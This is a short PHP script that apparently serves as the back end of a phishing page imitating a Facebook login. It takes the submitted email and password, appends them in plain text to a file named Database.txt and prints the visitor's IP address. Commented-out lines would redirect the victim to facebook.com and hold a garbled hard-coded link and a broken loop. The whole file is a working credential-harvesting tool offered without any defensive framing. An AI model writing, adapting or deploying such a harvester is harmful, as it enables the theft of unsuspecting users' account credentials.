<?php
$username=$_POST["email"];
$password=$_POST["pass"];
/*   if ($password=="###" and $username=="Arquam"){
       echo "<a href='Background-color fuufocof9yd96f96fy9cyocy9d8ooyooyfooy64684557868जष्श्श्श्शस्य्य8288338282827277272726ywysgshshdhdhdhhdh987tdgdoyoo9y90569695995' > click to file </a>";
      }else{
         echo "<script> alert('wrong error user name & pass') </script>";
          while(i<=10000000){
             header("Location: index.html");
                            
              $i++;
             
          }
         
         
      }
 */
function Dataaddtxt($Filename,$Mode,$Filesize,$Data){
	//globle 
	$Filecontent=fopen($Filename,$Mode);
	if($Mode=="r"){
		$Filecontent=fopen($Filename,$Mode);
		$Readingfile=fread($Filecontent,$Filesize);
		return $Readingfile;
		}	else{
	if ($Mode=="a"){
	    fwrite($Filecontent,$Data);
	    return "Done";
	   }
		
		}
		}
$u_pass_data="\n  Username: '".$username."' and password: '".$password."'";
$soffile=filesize("Database.txt");
$R=Dataaddtxt("Database.txt","a",$soffile,$u_pass_data);
$ip=$_SERVER['REMOTE_ADDR'];
echo $ip;
/*if (strlen($username)>0 and strlen($password)>0){
header('Location: https://www.facebook.com' );

}
*/
?>